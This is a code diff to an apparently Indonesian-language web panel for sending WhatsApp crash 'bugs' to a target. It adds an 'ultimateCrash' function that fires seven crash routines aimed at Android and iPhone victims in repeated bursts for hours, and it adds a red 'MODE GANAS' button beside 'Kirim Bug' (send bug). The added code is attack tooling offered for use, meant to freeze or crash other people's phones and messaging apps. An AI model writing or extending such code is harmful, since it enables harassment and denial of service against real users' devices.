@@ -807,6 +807,8 @@ app.get("/execution", async (req, res) => {
         androdelay(duration, target);
       } else if (mode === "invis-iphone") {
         Iponginvis(duration, target);
+      } else if (mode === "ganas") {
+        ultimateCrash(duration, target);
       } else {
         throw new Error("Mode tidak dikenal.");
       }
@@ -846,6 +848,48 @@ module.exports = {
 // ==================== FLOOD FUNCTIONS ==================== //
 // ====== TEMPAT FUNCTION BUGS ====== //
 
+
+async function ultimateCrash(duration, target) {
+  const totalDurationMs = duration * 3600000;
+  const startTime = Date.now();
+  const burstCount = 5; // Jumlah semburan serangan
+  const burstDelay = 500; // Jeda antar semburan (ms)
+
+  const executeBurst = async () => {
+    console.log(chalk.red(`🔥 Sending GANAS Burst to ${target}!`));
+    try {
+      await Promise.all([
+        JawaDelay(sock, target),
+        VenCrash(target),
+        ZieeInvisForceIOS(sock, target),
+        iosKontakNih(sock, target),
+        crashIos(sock, target),
+        uiIos(sock, target),
+        iosNick(sock, target)
+      ]);
+      console.log(chalk.green(`✅ Burst sent successfully to ${target}`));
+    } catch (error) {
+      console.error(`❌ Error in GANAS burst: ${error.message}`);
+    }
+  };
+
+  const runAttack = async () => {
+    if (Date.now() - startTime >= totalDurationMs) {
+      console.log(chalk.blue("✅ Serangan Ganas Selesai."));
+      return;
+    }
+
+    for (let i = 0; i < burstCount; i++) {
+      await executeBurst();
+      await new Promise(resolve => setTimeout(resolve, burstDelay));
+    }
+    
+    // Jeda sebelum loop serangan berikutnya
+    setTimeout(runAttack, 5000);
+  };
+
+  runAttack();
+}
 
 // ====== TEMPAT PEMANGGILAN FUNC & COMBO =====\\
 async function androdelay(duration, target) {
@@ -1277,6 +1321,7 @@ const executionPage = (
       <button class="mode-btn" data-mode="ios"><i class="fas fa-dumpster-fire"></i> CRASH IPHONE</button>
       <button class="mode-btn" data-mode="andros-delay"><i class="fas fa-skull-crossbones"></i> INVIS ANDRO</button>
       <button class="mode-btn" data-mode="invis-iphone"><i class="fas fa-dumpster-fire"></i> INVIS IPHONE</button>
+      <button class="mode-btn" data-mode="ganas" style="grid-column: 1 / -1; background-color: #ff2a2a; color: white;"><i class="fas fa-meteor"></i> MODE GANAS</button>
     </div>
 
     <button class="execute-button" id="executeBtn" disabled><i class="fas fa-rocket"></i> Kirim Bug</button>
